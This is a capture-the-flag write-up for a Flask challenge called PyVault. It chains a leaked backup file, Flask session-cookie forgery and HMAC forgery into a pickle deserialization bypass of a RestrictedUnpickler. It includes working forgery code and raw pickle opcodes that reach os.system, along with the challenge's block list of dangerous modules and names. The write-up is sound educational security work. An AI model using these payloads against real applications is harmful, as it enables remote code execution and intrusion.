# PyVault — Writeup

**Category:** Web  
**Flag:** `ictf{p1ckl3_r3str1ct10ns_4r3_just_4n_1llus10n_1f_y0u_kn0w_th3_0pc0d3s}`

---

## Overview

PyVault is a Flask-based "secure notes manager" with 4 layers of exploitation:

1. **Source code leak** via exposed backup directory
2. **Flask session forgery** using a leaked `SECRET_KEY`
3. **HMAC signature forgery** using a leaked signing key
4. **Pickle deserialization bypass** against a `RestrictedUnpickler`

---

## Layer 1 — Reconnaissance

Visiting `/robots.txt` reveals:

```
User-agent: *
Disallow: /admin
Disallow: /backup
```

Navigating to `/backup` shows a directory listing with `app.py.bak`. Downloading it gives us the full application source code, including:

- `SECRET_KEY = "5UP3R_S3CR3T_K3Y_D0NT_L34K_TH1S!"`
- `HMAC_KEY = b"vault_hmac_signing_key_2024_v2"`
- Guest credentials: `guest / guest123`
- The complete `RestrictedUnpickler` implementation

---

## Layer 2 — Flask Session Forgery

Flask signs session cookies using `itsdangerous` with the `SECRET_KEY`. Since we have the key, we can forge a valid admin session:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "5UP3R_S3CR3T_K3Y_D0NT_L34K_TH1S!"

session_data = {'user_id': 1, 'username': 'admin', 'is_admin': True}

si = SecureCookieSessionInterface()
serializer = si.get_signing_serializer(app)
cookie = serializer.dumps(session_data)
# Use this as the 'session' cookie value
```

With this cookie, we gain access to `/admin`.

---

## Layer 3 — Understanding the Import Feature

The admin panel has an **Export/Import** feature for vault backups. Examining the source:

- **Export**: Serializes notes with `pickle.dumps()`, then signs with `HMAC-SHA256` and base64-encodes: `base64(signature + pickle_data)`
- **Import**: Base64-decodes, verifies HMAC, then deserializes with `RestrictedUnpickler`

Since we have `HMAC_KEY`, we can sign arbitrary pickle payloads:

```python
sig = hmac.new(HMAC_KEY, pickle_data, hashlib.sha256).digest()
blob = base64.b64encode(sig + pickle_data).decode()
```

---

## Layer 4 — Bypassing the RestrictedUnpickler

This is the core of the challenge. The `RestrictedUnpickler.find_class()` implements:

| Check | Details |
|-------|---------|
| **BLOCKED_MODULES** | `os`, `subprocess`, `sys`, `shutil`, `ctypes`, `socket`, `signal`, `pty`, `commands`, `code`, `multiprocessing`, `threading`, `webbrowser`, ... |
| **BLOCKED_NAMES** | `system`, `popen`, `exec`, `eval`, `compile`, `__import__`, `open`, `Popen`, `call`, `run`, `fork`, `kill`, ... |
| **BLOCKED_DUNDERS** | All except `__init__`, `__new__`, `__dict__`, `__class__` |

### The Key Insight

`find_class()` is **only** invoked by the `GLOBAL` and `INST` pickle opcodes — it is the gatekeeper for resolving `module.name` references. But once a function is on the pickle stack, calling it via `REDUCE` does **not** trigger `find_class`. Arguments passed to functions are just data on the stack.

This means the blocklist has two critical gaps:

1. **`importlib` is NOT in BLOCKED_MODULES** → We can call `importlib.import_module('os')` to get the `os` module as a runtime object, completely bypassing the module blocklist.

2. **`getattr` is NOT in BLOCKED_NAMES** → We can call `builtins.getattr(os_module, 'system')` to get `os.system` as a function reference, bypassing the name blocklist.

### The Exploit Chain

In pickle pseudo-operations:

```
GLOBAL  importlib.import_module      # Allowed! importlib not blocked
REDUCE  ('os',)                      # Returns: <module 'os'>
PUT     memo[0]                      # Store os module

GLOBAL  builtins.getattr             # Allowed! getattr not blocked  
REDUCE  (memo[0], 'system')          # Returns: os.system (bypasses name check!)

REDUCE  ('cp /flag.txt /app/static/exfil.txt',)  # RCE!
```

### Raw Pickle Opcodes

```python
payload  = b'\x80\x02'                          # PROTO 2
payload += b'cimportlib\nimport_module\n'        # GLOBAL importlib.import_module
payload += b'(S\'os\'\ntR'                       # CALL('os') -> os module
payload += b'p0\n'                               # PUT 0 (store in memo)
payload += b'cbuiltins\ngetattr\n'               # GLOBAL builtins.getattr
payload += b'(g0\nS\'system\'\ntR'               # CALL(memo[0], 'system') -> os.system
payload += b'(S\'cp /flag.txt /app/static/exfil.txt\'\n'
payload += b'tR'                                 # CALL(command) -> RCE!
payload += b'.'                                  # STOP
```

### Why the Blocklist Fails

The fundamental flaw is architectural: **pickle's `find_class` only guards the GLOBAL resolution step, not the actual function execution.** Once `importlib.import_module` and `builtins.getattr` are resolved (both allowed), they become opaque callables. The unpickler has no mechanism to inspect what those functions *do* when called via REDUCE.

This is why the Python documentation states:

> *"The only safe approach is to never unpickle data from untrusted sources."*

No blocklist on `find_class` can be truly secure because:
- You can't block `importlib` without breaking most pickle use cases
- You can't block `getattr` without breaking attribute access
- Together, they give you `getattr(importlib.import_module('anything'), 'anything')`

---

## Full Exploitation

```bash
python3 exploit.py http://TARGET:5000
# Then visit: http://TARGET:5000/static/exfil.txt
```

The exploit:
1. Discovers the backup via `/robots.txt` → `/backup/app.py.bak`
2. Forges an admin session cookie using the leaked `SECRET_KEY`
3. Crafts a pickle payload that bypasses `RestrictedUnpickler`
4. Signs it with the leaked `HMAC_KEY`
5. Submits to `/admin/import`
6. Reads the flag from `/static/exfil.txt`

## Flag

`ictf{p1ckl3_r3str1ct10ns_4r3_just_4n_1llus10n_1f_y0u_kn0w_th3_0pc0d3s}`
